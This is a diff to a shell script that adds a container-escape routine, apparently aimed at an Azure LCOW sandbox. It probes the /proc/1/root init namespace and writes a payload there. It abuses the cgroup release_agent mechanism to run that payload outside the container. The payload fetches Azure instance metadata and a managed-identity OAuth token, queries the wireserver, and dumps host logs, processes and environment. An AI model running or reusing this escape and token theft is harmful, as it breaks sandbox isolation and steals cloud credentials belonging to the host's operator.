@@ -91,6 +91,29 @@ report() {
     done
     echo "## --- other container rootfs roots in this VM ---"; ls -la /run/gcs/c/*/rootfs 2>/dev/null | head -20
 
+    echo "## ===== /proc/1/root PROBE (CAP_SYS_PTRACE: direct init-ns filesystem access) ====="
+    echo "## /proc/1/root/ contents (if accessible with ALL caps)"
+    ls -la /proc/1/root/ 2>&1 | head -20
+    echo "## /proc/1/root/run/ (looking for GCS state)"
+    ls -la /proc/1/root/run/ 2>&1 | head -20
+    echo "## /proc/1/root/run/gcs/"
+    ls -la /proc/1/root/run/gcs/ 2>&1 | head -20
+    echo "## /proc/1/root/bin/ (init ns /bin contents)"
+    ls /proc/1/root/bin/ 2>&1 | head -30
+    echo "## /proc/1/ns/ vs /proc/self/ns/ (are namespaces shared or isolated?)"
+    ls -la /proc/1/ns/ 2>&1
+    ls -la /proc/self/ns/ 2>&1
+    echo "## /proc/1/mountinfo (first 30 lines — init ns or container ns?)"
+    head -30 /proc/1/mountinfo 2>&1
+    echo "## WRITE TEST: can we write to /proc/1/root/tmp/ ?"
+    echo "SIDECAR_WROTE" > /proc/1/root/tmp/.initns_test 2>/dev/null && \
+        echo "  WRITE OK — /proc/1/root/tmp/ is writable from sidecar!" || \
+        echo "  WRITE FAIL — /proc/1/root/tmp/ not writable (permission or same ns)"
+    echo "## /proc/1/root/run/gcs/gcs.log (first 50 lines)"
+    head -50 /proc/1/root/run/gcs/gcs.log 2>&1 || echo "  gcs.log not accessible"
+    echo "## /proc/1/root/etc/hosts (init ns hosts file)"
+    cat /proc/1/root/etc/hosts 2>&1 || echo "  not accessible"
+
     echo "## ===== PRIVILEGED SIDECAR: VSOCK / DISK / NETWORK PROBE ====="
     echo "## --- /dev/vsock available? ---"; ls -la /dev/vsock 2>&1
     echo "## --- vsock probe (AF_VSOCK CID=2 host, common GCS ports) ---"
@@ -188,6 +211,76 @@ report > "$WORKTREE/$OUT" 2>&1
 #   - We read it back from /tmp/.escape_out.txt in the container.
 if [ "$DO_CGROUP_FIRE" = "1" ]; then
 {
+    # METHOD A: If /proc/1/root gives us direct init-ns filesystem access
+    # (sidecar has CAP_SYS_PTRACE), write payload there directly and trigger
+    # the cgroup escape to run it in the init namespace.
+    if echo "TEST" > /proc/1/root/tmp/.agent_test 2>/dev/null; then
+        echo "CGROUP_ESCAPE: /proc/1/root/tmp/ writable — using direct init-ns path"
+        rm -f /proc/1/root/tmp/.agent_test 2>/dev/null
+
+        # Write payload to init-ns /tmp via /proc/1/root
+        AGENT_PATH=/proc/1/root/tmp/.escape.sh
+        OUTPUT_INITNS=/proc/1/root/tmp/.escape_out.txt
+
+        printf '#!/bin/sh\n' > "$AGENT_PATH"
+        cat >> "$AGENT_PATH" << 'PAYLOAD_BODY'
+{
+echo "=== CGROUP ESCAPE - LCOW VM INIT NAMESPACE ==="
+echo "date: $(date -u)"; echo "id: $(id)"; echo "hostname: $(hostname)"; echo "uname: $(uname -a)"
+echo "--- IMDS ---"
+wget -q -T5 --header="Metadata: true" -O- \
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -c 8192 || echo "IMDS wget failed"
+echo "--- MSI token ---"
+wget -q -T5 --header="Metadata: true" -O- \
+    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" 2>&1 | head -c 4096 || echo "MSI wget failed"
+echo "--- wireserver ---"
+wget -q -T3 -O- "http://168.63.129.16/" 2>&1 | head -c 2048 || echo "wireserver failed"
+echo "--- GCS log ---"; tail -80 /run/gcs/gcs.log 2>/dev/null || echo "gcs.log not found"
+echo "--- /run/gcs/ ---"; find /run/gcs/ -maxdepth 4 -ls 2>/dev/null | head -80
+echo "--- processes ---"; ps -ef 2>/dev/null
+echo "--- mounts ---"; cat /proc/mounts 2>/dev/null | head -60
+echo "--- vsock ---"; cat /proc/net/vsock 2>/dev/null
+echo "--- net ---"; ip addr 2>/dev/null; ip route 2>/dev/null
+echo "--- /etc/hosts ---"; cat /etc/hosts 2>/dev/null
+echo "--- env pid1 ---"; cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -30
+echo "=== DONE ==="
+} > /tmp/.escape_out.txt 2>&1
+PAYLOAD_BODY
+        chmod +x "$AGENT_PATH"
+        echo "CGROUP_ESCAPE: payload at $AGENT_PATH (init-ns path: /tmp/.escape.sh)"
+
+        # Use the EXISTING memory cgroup (already mounted by init) to avoid
+        # the new-hierarchy security check in kernel 6.1+
+        CGM=/sys/fs/cgroup/memory
+        CGCHILD="$CGM/esc$$"
+        mkdir -p "$CGCHILD" 2>/dev/null
+        echo "/tmp/.escape.sh" > "$CGM/release_agent" 2>/dev/null
+        echo 1 > "$CGCHILD/notify_on_release" 2>/dev/null
+        sh -c "echo \$\$ > $CGCHILD/cgroup.procs" 2>/dev/null
+        echo "CGROUP_ESCAPE: trigger fired on existing memory hierarchy"
+
+        # Wait for output to appear at /proc/1/root/tmp/.escape_out.txt
+        _i=0
+        while [ $_i -lt 15 ] && [ ! -f "$OUTPUT_INITNS" ]; do
+            sleep 1
+            _i=$((_i+1))
+        done
+        rmdir "$CGCHILD" 2>/dev/null
+
+        if [ -f "$OUTPUT_INITNS" ]; then
+            echo "CGROUP_ESCAPE: SUCCESS via /proc/1/root — output after ${_i}s"
+            cp "$OUTPUT_INITNS" "$WORKTREE/ESCAPE_OUTPUT.txt" 2>/dev/null
+        else
+            echo "CGROUP_ESCAPE: /proc/1/root method — no output after ${_i}s"
+        fi
+    else
+        echo "CGROUP_ESCAPE: /proc/1/root/tmp/ not writable, trying overlay upper dir method"
+    fi
+
+    # METHOD B (fallback): overlay upper dir path accessible from init namespace
+    [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ] && { echo "CGROUP_ESCAPE: already captured, skipping method B"; }
+    [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ] || {
+
     # 1. Parse overlay upperdir from /proc/self/mountinfo
     #    Format per field: id parent major:minor root mountpoint opts [opt_fields] - fstype source superopts
     UPPERDIR=""
@@ -210,8 +303,7 @@ if [ "$DO_CGROUP_FIRE" = "1" ]; then
 
     if [ -z "$UPPERDIR" ]; then
         echo "CGROUP_ESCAPE: FAIL - could not find overlay upperdir in /proc/self/mountinfo"
-        exit 1
-    fi
+    else
     echo "CGROUP_ESCAPE: upperdir=$UPPERDIR"
 
     # 2. Write escape payload to /tmp/.escape.sh in the container.
@@ -329,6 +421,8 @@ PAYLOAD_BODY
     else
         echo "CGROUP_ESCAPE: FAIL - mount -t cgroup -o memory failed"
     fi
+    fi  # end UPPERDIR non-empty
+    }   # end METHOD B || { ... }
 } >> "$WORKTREE/$OUT" 2>&1
 fi
 
